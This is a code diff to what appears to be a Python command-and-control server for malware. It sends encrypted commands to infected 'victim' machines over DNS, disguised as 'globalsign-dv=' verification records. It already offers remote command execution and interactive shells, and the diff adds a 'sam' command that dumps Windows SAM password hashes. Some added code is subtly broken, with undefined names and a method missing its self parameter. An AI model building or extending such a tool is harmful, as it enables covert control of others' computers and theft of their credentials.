@@ -51,7 +51,8 @@ def AESdecrypt(key, enc):
         enc = base64.b64decode(enc)
         iv = enc[:AES.block_size]
         cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
-        return _unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+        stringDec = cipher.decrypt(enc[AES.block_size:])
+        return stringDec.decode("utf-8")
 
 from dnslib import QTYPE, RR, DNSLabel, dns
 from dnslib.server import BaseResolver as LibBaseResolver, DNSServer as LibDNSServer
@@ -300,7 +301,8 @@ class VictimPayloads:
                            "lsproc": "List running processes X",
                            "qinfo": "Query basic computer information, such as hostname... X",
                            "exec": "Execute a single command on user (Usage: exec (command))",
-                           "shell": "Spawn a interactive shell on user X"
+                           "shell": "Spawn a interactive shell on user X",
+                           "sam":"SAM dump!"
                            }
     def notes(self, public_key_hash):
         global c2Statistics
@@ -359,6 +361,18 @@ class VictimPayloads:
         global stagedPayload_cmd, multiStagePayloadContent
         utils = Utils()
         match method:
+            case "sam":
+                stagedPayload_cmd = True
+                currentEncodedCommand.clear()
+                multiStagePayloadContent.clear()
+                AESKey = machineClassList[public_key_hash].AESKey
+                packet = "0" + "|" + "sm" + "|" + AESKey_Encoded.decode()
+                ciphertext = utils.RSAEncrypt(packet.encode(), machineClassList[public_key_hash].RSA_Victim_Public_Key)
+                command_split = [ciphertext[i: i + 220] for i in range(0, len(ciphertext), 220)]
+                for x in command_split:
+                    currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
+                return currentEncodedCommand
+
             case "sleep":
                 currentEncodedCommand.clear()
                 sleepTime = kwargs.get('sleepTime', None)
@@ -418,7 +432,13 @@ class VictimPayloads:
         packet = self.MethodToPacketEncoder("command", public_key_hash, command=command)
         commandMode = True
         currentEncodedCommand = packet
-        
+    
+    def samDump(public_key_hash):
+        global commandMode, currentEncodedCommand, stagedPayload, multiStagePayloadContent
+        packet = self.MethodToPacketEncoder("sam", public_key_hash, command=command)
+        commandMode = True
+        currentEncodedCommand = packet
+
 
     def exit(self):
         return 0
@@ -482,6 +502,8 @@ def victimInteract(public_key_hash):
 
             if(issuedCommand[0] == commands[8]):
                 victimHandler.command(issuedCommand, public_key_hash);
+            if(issuedCommand[0] == commands[9]):
+                victimHandler.samDump(public_key_hash)
         except IndexError:
             pass
         except Exception:
